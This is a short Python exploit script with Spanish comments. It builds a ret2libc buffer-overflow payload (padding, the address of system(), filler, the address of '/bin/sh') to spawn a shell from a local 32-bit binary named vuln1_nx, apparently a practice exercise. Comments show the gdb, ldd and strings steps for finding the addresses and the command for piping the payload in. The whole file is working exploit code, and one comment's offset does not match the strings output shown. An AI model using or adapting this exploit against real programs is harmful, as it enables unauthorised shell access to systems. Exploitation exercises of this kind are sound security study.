# !/usr/bin/env python3
import struct
import sys

offset = 94 # Ajustar segun lo hallado

# (gdb) p system
system_addr = 0xf7dba220 

# Opcion 1: Fuera de gdb
# ldd ./vuln1 -> /lib32/libc.so.6 (0xf7d66000)
# strings -t x /lib32/libc.so.6 | grep "/bin/sh" ->  1c6e52 /bin/sh
# (gdb) x/s 0xf7d66000+0x1c9e3c -> 0xf7f2fe3c:	"/bin/sh"

# Opcion 2: con GDB
# find 0xf7d7c000, 0xf7f9a000, "/bin/sh"
# binsh_addr = 0xf7f2ee52
# jump = 0xf7f2ee52 - system_addr
binsh_jump = 0x174C32

payload = b"A" * offset
payload += struct.pack ( "<I" , system_addr )
payload += b"JUNK" # Relleno
payload += struct.pack ( "<I" , system_addr +  binsh_jump)

# (python3 ./exploit.py; cat) | ./vuln1_nx
sys.stdout.buffer.write (payload)
